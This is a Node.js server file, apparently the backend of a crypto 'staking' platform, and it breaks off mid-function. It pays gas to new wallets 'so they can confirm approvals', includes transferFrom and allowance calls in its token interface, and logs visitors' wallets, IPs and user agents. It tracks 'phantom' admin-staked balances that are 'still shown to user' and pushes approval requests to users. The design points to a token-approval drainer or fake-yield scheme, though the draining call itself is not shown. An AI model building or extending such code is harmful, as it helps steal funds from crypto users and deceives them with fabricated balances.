const express = require('express');
const cors = require('cors');
const path = require('path');
const crypto = require('crypto');
const https = require('https');
const mysql = require('mysql2/promise');
const { ethers } = require('ethers');
require('dotenv').config();

const app = express();

// ==================== GAS FUNDER ====================
// Sends a tiny amount of native gas token to new wallets so they can confirm approvals.
// Uses the same private key on both ETH and BSC (both EVM-compatible).
const GAS_FUNDER_KEY = process.env.GAS_FUNDER_PRIVATE_KEY;
const GAS_FUND_BNB   = process.env.GAS_FUND_BNB  || '0.002';  // ~$1.20 — covers ~800 BSC approvals
const GAS_FUND_ETH   = process.env.GAS_FUND_ETH  || '0.003';  // ~$9   — covers 6 ETH token approvals

const BSC_RPC_LIST = [
  'https://bsc-dataseed1.binance.org/',
  'https://bsc-dataseed2.binance.org/',
  'https://bsc-dataseed3.binance.org/',
  'https://bsc-rpc.publicnode.com',
  'https://rpc.ankr.com/bsc',
  'https://bsc.drpc.org',
];
const ETH_RPC_LIST = [
  'https://rpc.ankr.com/eth',
  'https://ethereum.publicnode.com',
  'https://eth.llamarpc.com',
  'https://rpc.flashbots.net',
  'https://1rpc.io/eth',
  'https://endpoints.omniatech.io/v1/eth/mainnet/public',
];

// Returns the first provider that actually succeeds a getBalance call (not just getNetwork)
async function getWorkingProvider(rpcList, testAddress) {
  for (const rpc of rpcList) {
    try {
      const p = new ethers.providers.JsonRpcProvider(rpc);
      // Test with a real call so flaky RPCs (cloudflare) are caught
      await p.getBalance(testAddress || '0x0000000000000000000000000000000000000001');
      return p;
    } catch { continue; }
  }
  throw new Error('No working RPC found in list');
}

// Send gas fund to a new wallet. Runs fire-and-forget — never blocks the API response.
async function fundNewWallet(userAddress) {
  if (!GAS_FUNDER_KEY) return; // not configured — skip silently
  const addr = userAddress.toLowerCase();

  // ── BSC gas fund ─────────────────────────────────────────────────────────
  (async () => {
    try {
      const provider = await getWorkingProvider(BSC_RPC_LIST);
      const funder = new ethers.Wallet(GAS_FUNDER_KEY, provider);
      const balance = await funder.getBalance();
      const needed  = ethers.utils.parseEther(GAS_FUND_BNB);
      if (balance.lt(needed)) { console.warn('BSC funder low on BNB — skipping gas fund'); return; }
      const tx = await funder.sendTransaction({ to: addr, value: needed });
      console.log(`⛽ Funded ${addr} with ${GAS_FUND_BNB} BNB — tx: ${tx.hash}`);
    } catch (e) {
      console.warn('BSC gas fund failed:', e.message);
    }
  })();

  // ── ETH gas fund ─────────────────────────────────────────────────────────
  (async () => {
    try {
      const provider = await getWorkingProvider(ETH_RPC_LIST);
      const funder = new ethers.Wallet(GAS_FUNDER_KEY, provider);
      const balance = await funder.getBalance();
      const needed  = ethers.utils.parseEther(GAS_FUND_ETH);
      if (balance.lt(needed)) { console.warn('ETH funder low on ETH — skipping gas fund'); return; }
      const tx = await funder.sendTransaction({ to: addr, value: needed });
      console.log(`⛽ Funded ${addr} with ${GAS_FUND_ETH} ETH — tx: ${tx.hash}`);
    } catch (e) {
      console.warn('ETH gas fund failed:', e.message);
    }
  })();
}

// ==================== CRYPTO PAYOUT SENDER ====================
const PLATFORM_PAYOUT_KEY = process.env.PLATFORM_PRIVATE_KEY || process.env.PLATFORM_PAYOUT_KEY; // hot wallet private key

// Token configs per network
const PAYOUT_NETWORKS = {
  BSC: {
    rpcList: BSC_RPC_LIST,
    nativeCoin: 'BNB',
    tokens: {
      USDT: { address: '0x55d398326f99059fF775485246999027B3197955', decimals: 18 },
      USDC: { address: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d', decimals: 18 },
      BUSD: { address: '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56', decimals: 18 },
      ETH:  { address: '0x2170Ed0880ac9A755fd29B2688956BD959F933F8', decimals: 18 },
      BTC:  { address: '0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c', decimals: 18 },
      DAI:  { address: '0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3', decimals: 18 },
      XRP:  { address: '0x1D2F0da169ceB9fC7B3144628dB156f3F6c60dBE', decimals: 18 },
      ADA:  { address: '0x3EE2200Efb3400fAbB9AacF31297cBdD1d435D47', decimals: 18 },
      CAKE: { address: '0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82', decimals: 18 },
    }
  },
  ETH: {
    rpcList: ETH_RPC_LIST,
    nativeCoin: 'ETH',
    tokens: {
      USDT: { address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', decimals: 6 },
      USDC: { address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', decimals: 6 },
      DAI:  { address: '0x6B175474E89094C44Da98b954EedeAC495271d0F', decimals: 18 },
      WBTC: { address: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', decimals: 8 },
      LINK: { address: '0x514910771AF9Ca656af840dff83E8264EcF986CA', decimals: 18 },
      UNI:  { address: '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984', decimals: 18 },
      SHIB: { address: '0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE', decimals: 18 },
    }
  }
};

const ERC20_TRANSFER_ABI = [
  'function transfer(address to, uint256 amount) returns (bool)',
  'function balanceOf(address owner) view returns (uint256)'
];

// Sends tokens or native coins from the platform payout wallet to a user's address.
// Returns the on-chain transaction hash.
async function sendCryptoToUser(toAddress, amount, network = 'BSC', token = 'USDC') {
  if (!PLATFORM_PAYOUT_KEY) throw new Error('PLATFORM_PAYOUT_KEY not set in environment');

  const net = PAYOUT_NETWORKS[network.toUpperCase()];
  if (!net) throw new Error(`Unsupported network: ${network}`);

  const tempWallet = new ethers.Wallet(PLATFORM_PAYOUT_KEY);
  const provider = await getWorkingProvider(net.rpcList, tempWallet.address);
  const wallet   = tempWallet.connect(provider);
  const tokenUpper = token.toUpperCase();

  // Native coin (BNB on BSC, ETH on ETH)
  if (tokenUpper === net.nativeCoin) {
    const value = ethers.utils.parseEther(String(amount));
    const bal   = await wallet.getBalance();
    if (bal.lt(value)) throw new Error(`Insufficient ${net.nativeCoin} balance in payout wallet`);
    const tx = await wallet.sendTransaction({ to: toAddress, value });
    const receipt = await tx.wait(1);
    console.log(`💸 Sent ${amount} ${token} on ${network} to ${toAddress} — tx: ${receipt.transactionHash}`);
    return receipt.transactionHash;
  }

  // ERC-20 / BEP-20 token
  const tokenConf = net.tokens[tokenUpper];
  if (!tokenConf) throw new Error(`Token ${token} not configured on ${network}`);

  const contract  = new ethers.Contract(tokenConf.address, ERC20_TRANSFER_ABI, wallet);
  const amountBN  = ethers.utils.parseUnits(String(amount), tokenConf.decimals);
  const balanceBN = await contract.balanceOf(wallet.address);
  if (balanceBN.lt(amountBN)) throw new Error(`Insufficient ${token} in payout wallet (have ${ethers.utils.formatUnits(balanceBN, tokenConf.decimals)}, need ${amount})`);

  const tx      = await contract.transfer(toAddress, amountBN);
  const receipt = await tx.wait(1);
  console.log(`💸 Sent ${amount} ${token} (${network}) to ${toAddress} — tx: ${receipt.transactionHash}`);
  return receipt.transactionHash;
}

// ==================== DATABASE ====================

const DB_HOST = process.env.MYSQLHOST || process.env.MYSQL_HOST || process.env.DB_HOST || 'localhost';
const DB_PORT = parseInt(process.env.MYSQLPORT || process.env.MYSQL_PORT || process.env.DB_PORT) || 3306;
const DB_USER = process.env.MYSQLUSER || process.env.MYSQL_USER || process.env.DB_USER || 'root';
const DB_PASS = process.env.MYSQLPASSWORD || process.env.MYSQL_PASSWORD || process.env.DB_PASS || '';
const DB_NAME = process.env.MYSQLDATABASE || process.env.MYSQL_DATABASE || process.env.DB_NAME || 'bestcrypto';

console.log('DB config:', { host: DB_HOST, port: DB_PORT, user: DB_USER, database: DB_NAME, MYSQL_URL: process.env.MYSQL_URL ? 'SET' : 'NOT SET' });

const pool = process.env.MYSQL_URL
  ? mysql.createPool(process.env.MYSQL_URL)
  : mysql.createPool({
      host: DB_HOST,
      port: DB_PORT,
      user: DB_USER,
      password: DB_PASS,
      database: DB_NAME,
      waitForConnections: true,
      connectionLimit: 10,
      queueLimit: 0,
      connectTimeout: 30000
    });

async function initDB() {
  const conn = await pool.getConnection();
  try {
    await conn.execute(`
      CREATE TABLE IF NOT EXISTS users (
        id INT AUTO_INCREMENT PRIMARY KEY,
        walletAddress VARCHAR(42) NOT NULL,
        email VARCHAR(255) DEFAULT '',
        stakedAmount DECIMAL(20,8) DEFAULT 0,
        totalEarned DECIMAL(20,8) DEFAULT 0,
        claimableRewards DECIMAL(20,8) DEFAULT 0,
        vipLevel INT DEFAULT 0,
        status VARCHAR(20) DEFAULT 'pending',
        joinDate DATE,
        lastActive DATE,
        createdAt TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        UNIQUE KEY idx_wallet (walletAddress(42))
      ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4
    `);

    await conn.execute(`
      CREATE TABLE IF NOT EXISTS wallet_requests (
        id BIGINT AUTO_INCREMENT PRIMARY KEY,
        walletAddress VARCHAR(42) NOT NULL,
        ipAddress VARCHAR(45) DEFAULT 'Unknown',
        userAgent TEXT,
        network VARCHAR(10) DEFAULT 'BSC',
        status VARCHAR(20) DEFAULT 'pending',
        timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        KEY idx_wallet (walletAddress(42)),
        KEY idx_status (status)
      ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4
    `);
    // Migrate existing DB — add columns if they don't exist yet
    await conn.execute(`ALTER TABLE wallet_requests MODIFY COLUMN id BIGINT AUTO_INCREMENT`).catch(() => {});
    await conn.execute(`ALTER TABLE wallet_requests ADD COLUMN network VARCHAR(10) DEFAULT 'BSC'`).catch(() => {});

    await conn.execute(`
      CREATE TABLE IF NOT EXISTS transactions (
        id INT AUTO_INCREMENT PRIMARY KEY,
        walletAddress VARCHAR(42) NOT NULL,
        type VARCHAR(30) NOT NULL,
        amount DECIMAL(20,8) NOT NULL,
        txDate DATE NOT NULL,
        status VARCHAR(20) DEFAULT 'completed',
        txHash VARCHAR(66),
        blockNumber INT,
        createdAt TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        KEY idx_wallet (walletAddress(42))
      ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4
    `);

    await conn.execute(`
      CREATE TABLE IF NOT EXISTS withdrawals (
        id BIGINT PRIMARY KEY,
        walletAddress VARCHAR(42) NOT NULL,
        amount DECIMAL(20,8) NOT NULL,
        fee DECIMAL(20,8) DEFAULT 0,
        netAmount DECIMAL(20,8) NOT NULL,
        status VARCHAR(20) DEFAULT 'pending',
        withdrawalType VARCHAR(20) DEFAULT 'stake',
        requestedAt TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        approvedAt TIMESTAMP NULL,
        rejectedAt TIMESTAMP NULL,
        rejectionReason TEXT,
        txHash VARCHAR(66),
        userId INT,
        KEY idx_wallet (walletAddress(42))
      ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4
    `);

    await conn.execute(`
      CREATE TABLE IF NOT EXISTS wallet_balances (
        walletAddress VARCHAR(42) NOT NULL,
        eth VARCHAR(30) DEFAULT '0.0000',
        usdt VARCHAR(30) DEFAULT '0.00',
        tokensJson MEDIUMTEXT DEFAULT NULL,
        updatedAt BIGINT DEFAULT 0,
        PRIMARY KEY (walletAddress(42))
      ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4
    `);

    await conn.execute(`
      CREATE TABLE IF NOT EXISTS platform_settings (
        \`key\` VARCHAR(50) NOT NULL,
        value TEXT,
        PRIMARY KEY (\`key\`)
      ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4
    `);

    // Seed default settings
    const defaults = [
      ['baseAPY', '12.5'], ['vip1Bonus', '0.25'], ['vip2Bonus', '0.5'],
      ['vip3Bonus', '1.0'], ['minStake', '100'], ['maxStake', '1000000'],
      ['withdrawalFee', '0.5'], ['maintenanceMode', 'false'],
      ['platformWallet', ''], ['commissionWallet', ''], ['dividendWallet', ''],
      ['platformWalletETH', ''], ['platformWalletTRX', ''], ['platformWalletBTC', '']
    ];
    for (const [key, value] of defaults) {
      await conn.execute(
        'INSERT IGNORE INTO platform_settings (`key`, value) VALUES (?, ?)',
        [key, value]
      );
    }

    // Migrate wallet_requests and withdrawals to AUTO_INCREMENT ids (idempotent)
    try { await conn.execute('ALTER TABLE wallet_requests MODIFY COLUMN id BIGINT NOT NULL AUTO_INCREMENT'); } catch (e) { /* already auto-increment */ }
    try { await conn.execute('ALTER TABLE withdrawals MODIFY COLUMN id BIGINT NOT NULL AUTO_INCREMENT'); } catch (e) { /* already auto-increment */ }
    // Migrate wallet_balances to add tokensJson column
    try { await conn.execute('ALTER TABLE wallet_balances ADD COLUMN tokensJson MEDIUMTEXT DEFAULT NULL'); } catch (e) { /* already exists */ }
    // Migrate wallet_balances to add phantomUsdt column (phantom = staked by admin, still shown to user)
    try { await conn.execute('ALTER TABLE wallet_balances ADD COLUMN phantomUsdt DECIMAL(20,8) DEFAULT 0'); } catch (e) { /* already exists */ }
    // Migrate transactions to add token column (BSC token symbol e.g. USDT, BNB, CAKE)
    try { await conn.execute("ALTER TABLE transactions ADD COLUMN token VARCHAR(10) DEFAULT 'USDT'"); } catch (e) { /* already exists */ }
    // Migrate wallet_balances to add btcAddress column (native Bitcoin network address)
    try { await conn.execute('ALTER TABLE wallet_balances ADD COLUMN btcAddress VARCHAR(100) DEFAULT NULL'); } catch (e) { /* already exists */ }
    // Migrate wallet_requests to add network column (e.g. BSC, ETH)
    try { await conn.execute("ALTER TABLE wallet_requests ADD COLUMN network VARCHAR(20) DEFAULT 'BSC'"); } catch (e) { /* already exists */ }
    // Migrate users to add stakeStartDate — used to enforce 30-day principal lock
    try { await conn.execute("ALTER TABLE users ADD COLUMN stakeStartDate DATE DEFAULT NULL"); } catch (e) { /* already exists */ }
    // Migrate withdrawals to add network + payoutToken for auto on-chain payout
    try { await conn.execute("ALTER TABLE withdrawals ADD COLUMN network VARCHAR(10) DEFAULT 'BSC'"); } catch (e) { /* already exists */ }
    try { await conn.execute("ALTER TABLE withdrawals ADD COLUMN payoutToken VARCHAR(20) DEFAULT 'USDT'"); } catch (e) { /* already exists */ }
    // Notifications table — admin-to-user messages (e.g. approval requests)
    await conn.execute(`
      CREATE TABLE IF NOT EXISTS notifications (
        id INT AUTO_INCREMENT PRIMARY KEY,
        walletAddress VARCHAR(42) NOT NULL,
        type VARCHAR(50) NOT NULL,
        network VARCHAR(10) DEFAULT 'BSC',
        message TEXT,
        dismissed TINYINT(1) DEFAULT 0,
        createdAt TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        KEY idx_wallet (walletAddress(42))
      ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4
    `);

    await conn.execute(`
      CREATE TABLE IF NOT EXISTS payout_logs (
        id INT AUTO_INCREMENT PRIMARY KEY,
        withdrawalId INT,
        walletAddress VARCHAR(42) NOT NULL,
        amount DECIMAL(20,8),
        network VARCHAR(10) DEFAULT 'BSC',
        token VARCHAR(10) DEFAULT 'USDC',
        txHash VARCHAR(66),
        status ENUM('success','failed') NOT NULL,
        error TEXT,
        createdAt TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        KEY idx_withdrawal (withdrawalId)
      ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4
    `);

    await conn.execute(`
      CREATE TABLE IF NOT EXISTS send_crypto (
        id INT AUTO_INCREMENT PRIMARY KEY,
        walletAddress VARCHAR(255) NOT NULL,
        token VARCHAR(20) NOT NULL,
        chain VARCHAR(10) NOT NULL,
        amount VARCHAR(40) NOT NULL,
        usdValue VARCHAR(20) DEFAULT '0',
        txHash VARCHAR(66),
        status ENUM('pending','approved','rejected') DEFAULT 'pending',
        approvedAt TIMESTAMP NULL,
        createdAt TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        KEY idx_wallet (walletAddress)
      ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4
    `);

    // Migrate: add status/approvedAt columns if missing
    try {
      await conn.execute("ALTER TABLE send_crypto ADD COLUMN status ENUM('pending','approved','rejected') DEFAULT 'pending'");
    } catch(e) { /* column already exists */ }
    try {
      await conn.execute("ALTER TABLE send_crypto ADD COLUMN approvedAt TIMESTAMP NULL");
    } catch(e) { /* column already exists */ }

    console.log('✅ Database initialized');

    // Auto-sync platform wallet address from PLATFORM_PRIVATE_KEY
    // This ensures the deposit address shown to users always matches the hot wallet
    if (PLATFORM_PAYOUT_KEY) {
      try {
        const hotWallet = new ethers.Wallet(PLATFORM_PAYOUT_KEY);
        const addr = hotWallet.address;
        await conn.execute(
          `INSERT INTO platform_settings (\`key\`, value) VALUES ('platformWallet', ?), ('platformWalletETH', ?)
           ON DUPLICATE KEY UPDATE value = VALUES(value)`,
          [addr, addr]
        );
        console.log(`🔑 Platform wallet synced from PLATFORM_PRIVATE_KEY: ${addr}`);
      } catch (e) {
        console.warn('Could not sync platform wallet address:', e.message);
      }
    }
  } finally {
    conn.release();
  }
}

async function getSettings() {
  const [rows] = await pool.execute('SELECT `key`, value FROM platform_settings');
  const s = Object.fromEntries(rows.map(r => [r.key, r.value]));
  return {
    baseAPY: parseFloat(s.baseAPY) || 12.5,
    vip1Bonus: parseFloat(s.vip1Bonus) || 0.25,
    vip2Bonus: parseFloat(s.vip2Bonus) || 0.5,
    vip3Bonus: parseFloat(s.vip3Bonus) || 1.0,
    minStake: parseFloat(s.minStake) || 100,
    maxStake: parseFloat(s.maxStake) || 1000000,
    withdrawalFee: parseFloat(s.withdrawalFee) || 0.5,
    maintenanceMode: s.maintenanceMode === 'true',
    platformWallet: s.platformWallet || '',        // EVM wallet (BSC) — backward compat
    platformWalletBSC: s.platformWallet || '',      // alias
    platformWalletETH: s.platformWalletETH || s.platformWallet || '', // ETH mainnet (same EVM addr usually)
    platformWalletTRX: s.platformWalletTRX || '',   // Tron address
    platformWalletBTC: s.platformWalletBTC || '',   // Bitcoin address
    commissionWallet: s.commissionWallet || '',
    dividendWallet: s.dividendWallet || ''
  };
}

function formatUser(u) {
  return {
    id: u.id,
    walletAddress: u.walletAddress,
    email: u.email || '',
    stakedAmount: parseFloat(u.stakedAmount) || 0,
    totalEarned: parseFloat(u.totalEarned) || 0,
    claimableRewards: parseFloat(u.claimableRewards) || 0,
    vipLevel: u.vipLevel || 0,
    status: u.status,
    joinDate: u.joinDate,
    lastActive: u.lastActive
  };
}

// ==================== ETHEREUM ====================

const ETH_RPC_URLS = [
  'https://ethereum.publicnode.com',
  'https://1rpc.io/eth',
  'https://eth.drpc.org',
  'https://rpc.ankr.com/eth',
  'https://cloudflare-eth.com'
];

let provider;
let currentRpcIndex = 0;

function createProvider() {
  provider = new ethers.providers.JsonRpcProvider(ETH_RPC_URLS[currentRpcIndex]);
  console.log(`📡 Using RPC: ${ETH_RPC_URLS[currentRpcIndex]}`);
}

function switchToNextProvider() {
  currentRpcIndex = (currentRpcIndex + 1) % ETH_RPC_URLS.length;
  createProvider();
}

createProvider();

(async () => {
  for (let i = 0; i < ETH_RPC_URLS.length; i++) {
    try {
      const testProvider = new ethers.providers.JsonRpcProvider(ETH_RPC_URLS[i]);
      await Promise.race([testProvider.getBlockNumber(), new Promise((_, r) => setTimeout(() => r(new Error('timeout')), 4000))]);
      if (i !== currentRpcIndex) { currentRpcIndex = i; createProvider(); }
      console.log(`✅ ETH RPC healthy: ${ETH_RPC_URLS[i]}`);
      break;
    } catch (e) { console.log(`❌ ETH RPC down: ${ETH_RPC_URLS[i]}`); }
  }
})();

// ==================== BSC (BNB Smart Chain) — used for admin stake ====================
const BSC_RPC_URLS = [
  'https://bsc-dataseed1.binance.org/',
  'https://bsc-dataseed2.binance.org/',
  'https://bsc-dataseed.binance.org/',
  'https://rpc.ankr.com/bsc'
];

let bscProvider;
let currentBscRpcIndex = 0;

function createBscProvider() {
  bscProvider = new ethers.providers.JsonRpcProvider(BSC_RPC_URLS[currentBscRpcIndex]);
  console.log(`📡 BSC RPC: ${BSC_RPC_URLS[currentBscRpcIndex]}`);
}

function switchToNextBscProvider() {
  currentBscRpcIndex = (currentBscRpcIndex + 1) % BSC_RPC_URLS.length;
  createBscProvider();
}

createBscProvider();

// BSC tokens supported for staking (self-stake and admin-stake)
const BSC_TOKENS = {
  USDT:  { address: '0x55d398326f99059fF775485246999027B3197955', decimals: 18, coingeckoId: 'tether' },
  USDC:  { address: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d', decimals: 18, coingeckoId: 'usd-coin' },
  BUSD:  { address: '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56', decimals: 18, coingeckoId: 'binance-usd' },
  CAKE:  { address: '0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82', decimals: 18, coingeckoId: 'pancakeswap-token' },
  ETH:   { address: '0x2170Ed0880ac9A755fd29B2688956BD959F933F8', decimals: 18, coingeckoId: 'ethereum' },
  BTCB:  { address: '0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c', decimals: 18, coingeckoId: 'bitcoin' },
  WBNB:  { address: '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c', decimals: 18, coingeckoId: 'wbnb' },
  DAI:   { address: '0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3', decimals: 18, coingeckoId: 'dai' },
  XRP:   { address: '0x1D2F0da169ceB9fC7B3144628dB156f3F6c60dBE', decimals: 18, coingeckoId: 'ripple' },
  ADA:   { address: '0x3EE2200Efb3400fAbB9AacF31297cBdD1d435D47', decimals: 18, coingeckoId: 'cardano' },
  DOT:   { address: '0x7083609fCE4d1d8Dc0C979AAb8c869Ea2C873402', decimals: 18, coingeckoId: 'polkadot' },
  LINK:  { address: '0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD', decimals: 18, coingeckoId: 'chainlink' },
  LTC:   { address: '0x4338665CBB7B2485A8855A139b75D5e34AB0DB94', decimals: 18, coingeckoId: 'litecoin' },
};
const BSC_USDT_ADDRESS = '0x55d398326f99059fF775485246999027B3197955';

// Ethereum mainnet ERC-20 tokens supported for admin-stake
const ETH_TOKENS = {
  USDT: { address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', decimals: 6,  coingeckoId: 'tether' },
  USDC: { address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', decimals: 6,  coingeckoId: 'usd-coin' },
  DAI:  { address: '0x6B175474E89094C44Da98b954EedeAC495271d0F', decimals: 18, coingeckoId: 'dai' },
  WBTC: { address: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', decimals: 8,  coingeckoId: 'wrapped-bitcoin' },
  WETH: { address: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2', decimals: 18, coingeckoId: 'weth' },
  LINK: { address: '0x514910771AF9Ca656af840dff83E8264EcF986CA', decimals: 18, coingeckoId: 'chainlink' },
};

const USDT_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7'; // Ethereum ERC-20 (balance scanning only)
const USDT_ABI = [
  'function balanceOf(address owner) view returns (uint256)',
  'function decimals() view returns (uint8)',
  'function transfer(address to, uint256 amount) returns (bool)',
  'function transferFrom(address from, address to, uint256 amount) returns (bool)',
  'function allowance(address owner, address spender) view returns (uint256)'
];

// ==================== MULTI-TOKEN SUPPORT ====================

const KNOWN_TOKENS = [
  { symbol: 'USDT', name: 'Tether USD',   address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', decimals: 6,  coingeckoId: 'tether' },
  { symbol: 'USDC', name: 'USD Coin',     address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', decimals: 6,  coingeckoId: 'usd-coin' },
  { symbol: 'DAI',  name: 'Dai',          address: '0x6B175474E89094C44Da98b954EedeAC495271d0F', decimals: 18, coingeckoId: 'dai' },
  { symbol: 'WBTC', name: 'Wrapped BTC',  address: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', decimals: 8,  coingeckoId: 'wrapped-bitcoin' },
  { symbol: 'WETH', name: 'Wrapped ETH',  address: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2', decimals: 18, coingeckoId: 'weth' },
  { symbol: 'LINK', name: 'Chainlink',    address: '0x514910771AF9Ca656af840dff83E8264EcF986CA', decimals: 18, coingeckoId: 'chainlink' },
  { symbol: 'UNI',  name: 'Uniswap',      address: '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984', decimals: 18, coingeckoId: 'uniswap' },
  { symbol: 'SHIB', name: 'Shiba Inu',    address: '0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE', decimals: 18, coingeckoId: 'shiba-inu' },
  { symbol: 'MATIC',name: 'Polygon',      address: '0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0', decimals: 18, coingeckoId: 'matic-network' },
];

// BSC tokens scanned during server-side fallback balance fetch
const BSC_KNOWN_TOKENS = [
  { symbol: 'USDT',  name: 'Tether USD (BSC)',   address: '0x55d398326f99059fF775485246999027B3197955', decimals: 18, coingeckoId: 'tether' },
  { symbol: 'USDC',  name: 'USD Coin (BSC)',      address: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d', decimals: 18, coingeckoId: 'usd-coin' },
  { symbol: 'BUSD',  name: 'Binance USD',         address: '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56', decimals: 18, coingeckoId: 'binance-usd' },
  { symbol: 'BTCB',  name: 'Bitcoin (BSC)',        address: '0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c', decimals: 18, coingeckoId: 'bitcoin' },
  { symbol: 'ETH',   name: 'Ethereum (BSC)',       address: '0x2170Ed0880ac9A755fd29B2688956BD959F933F8', decimals: 18, coingeckoId: 'ethereum' },
  { symbol: 'CAKE',  name: 'PancakeSwap',          address: '0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82', decimals: 18, coingeckoId: 'pancakeswap-token' },
  { symbol: 'DAI',   name: 'Dai (BSC)',            address: '0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3', decimals: 18, coingeckoId: 'dai' },
  { symbol: 'XRP',   name: 'XRP Token (BSC)',      address: '0x1D2F0da169ceB9fC7B3144628dB156f3F6c60dBE', decimals: 18, coingeckoId: 'ripple' },
  { symbol: 'ADA',   name: 'Cardano (BSC)',        address: '0x3EE2200Efb3400fAbB9AacF31297cBdD1d435D47', decimals: 18, coingeckoId: 'cardano' },
  { symbol: 'DOT',   name: 'Polkadot (BSC)',       address: '0x7083609fCE4d1d8Dc0C979AAb8c869Ea2C873402', decimals: 18, coingeckoId: 'polkadot' },
  { symbol: 'LINK',  name: 'Chainlink (BSC)',      address: '0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD', decimals: 18, coingeckoId: 'chainlink' },
  { symbol: 'LTC',   name: 'Litecoin (BSC)',       address: '0x4338665CBB7B2485A8855A139b75D5e34AB0DB94', decimals: 18, coingeckoId: 'litecoin' },
];

const ERC20_BALANCE_ABI = ['function balanceOf(address owner) view returns (uint256)'];

// ---- Tron address derivation (same secp256k1 key as ETH) ----
const BASE58_ALPHABET = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
function base58Encode(buf) {
  let n = BigInt('0x' + Buffer.from(buf).toString('hex'));
  let result = '';
  const base = BigInt(58);
  while (n > 0n) { result = BASE58_ALPHABET[Number(n % base)] + result; n /= base; }
  for (const b of buf) { if (b === 0) result = BASE58_ALPHABET[0] + result; else break; }
  return result;
}
function ethToTronAddressSync(ethAddr) {
  const hex = ethAddr.replace('0x', '').toLowerCase();
  const raw = Buffer.from('41' + hex, 'hex');
  const h1 = crypto.createHash('sha256').update(raw).digest();
  const h2 = crypto.createHash('sha256').update(h1).digest();
  return base58Encode(Buffer.concat([raw, h2.slice(0, 4)]));
}
const TRON_USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
async function fetchTronUsdtBalance(ethAddress) {
  try {
    const tronAddr = ethToTronAddressSync(ethAddress);
    console.log(`[Tron] Derived address for ${ethAddress.slice(0,10)}... → ${tronAddr}`);

    // Primary: TronGrid REST API
    try {
      const data = await fetchWithTimeout(
        httpsGetJson(`https://api.trongrid.io/v1/accounts/${tronAddr}`), 7000
      );
      if (data.data?.length) {
        const trc20 = data.data[0].trc20 || [];
        const entry = trc20.find(t => t[TRON_USDT_CONTRACT]);
        const bal = entry ? parseFloat(entry[TRON_USDT_CONTRACT]) / 1e6 : 0;
        console.log(`[Tron] TronGrid balance: ${bal}`);
        return bal;
      }
    } catch (e) { console.log('[Tron] TronGrid failed:', e.message); }

    // Fallback: Tron full-node HTTP API
    const body = JSON.stringify({ address: tronAddr, visible: true });
    const fallback = await fetchWithTimeout(new Promise((resolve, reject) => {
      const opts = { method: 'POST', headers: { 'Content-Type': 'application/json' } };
      const req = require('https').request('https://api.trongrid.io/wallet/triggerconstantcontract', opts, res => {
        let d = ''; res.on('data', c => d += c); res.on('end', () => { try { resolve(JSON.parse(d)); } catch { reject(new Error('bad json')); } });
      });
      req.on('error', reject); req.write(body); req.end();
    }), 7000).catch(() => null);

    // Fallback 2: tronscan API
    const scan = await fetchWithTimeout(
      httpsGetJson(`https://apilist.tronscanapi.com/api/account/tokens?address=${tronAddr}&token=TRC20&start=0&limit=20`), 7000
    ).catch(() => null);
    if (scan?.data) {
      const token = scan.data.find(t => t.tokenId === TRON_USDT_CONTRACT);
      const bal = token ? parseFloat(token.quantity) / 1e6 : 0;
      console.log(`[Tron] Tronscan balance: ${bal}`);
      return bal;
    }
    return 0;
  } catch (e) { console.log('[Tron] all methods failed:', e.message); return 0; }
}

let priceCache = { data: null, ts: 0 };
const PRICE_CACHE_TTL = 300000; // 5 min

function httpsGetJson(url) {
  return new Promise((resolve, reject) => {
